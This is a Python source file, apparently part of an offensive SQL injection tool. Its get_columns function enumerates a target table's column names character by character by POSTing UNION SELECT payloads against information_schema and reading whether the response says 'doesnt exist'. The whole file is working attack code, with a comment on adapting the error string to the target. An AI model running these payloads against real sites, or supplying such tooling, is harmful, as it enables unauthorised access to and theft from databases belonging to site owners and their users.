from requests import *
import json
import time
from colorama import Fore,init;init()

def get_columns(url,param,table,database):
    chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
    
    req_t = post(url, data={param : "thisisboulshetttt"})
    res_t = json.loads(req_t.text)

    for i in res_t:
        if (res_t[i] == "doesnt exist"):  # you should change here `doesnt exist` to your error
            indx_name = i

    if(indx_name == None or indx_name == ""):
        print("TABLE=>cant get index name of return response pls change app/database.py line 13 `doesnt exist` error")
    else:
        pass

    columns = []
    column = ""
    char = 0

    def gc(c):
        t = c
        ch = 0
        while(ch != len(chars)):
            # time.sleep(0.1)
            d = {param : f"0' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND column_name LIKE '{t}{chars[ch]}%' AND TABLE_SCHEMA='{database}'#"}
            req = post(url,data=d)
            res = json.loads(req.text)
            if(res[indx_name] == "doesnt exist"):
                ch+=1
            else:
                t+=chars[ch]
                ch = 0
        return t



    while(char != len(chars)):
        if(len(column) > 0):
            d = {param : f"0' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND column_name LIKE '{table}{chars[char]}%' AND TABLE_SCHEMA='{database}'#"}
        else:
            d = {param : f"0' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND column_name LIKE '{chars[char]}%' AND TABLE_SCHEMA='{database}'#"}
        
        # print(d)
        # time.sleep(0.1)
        req = post(url,data=d)
        res = json.loads(req.text)

        if(res[indx_name] == "doesnt exist"):
            char+=1
        else:
            t = gc(chars[char])
            columns.append(t)
            char+=1

    print(Fore.GREEN+f"[+] ",end="")
    for column in columns:
        print(f", {column}",end="")
    print("\n\n")
    return columns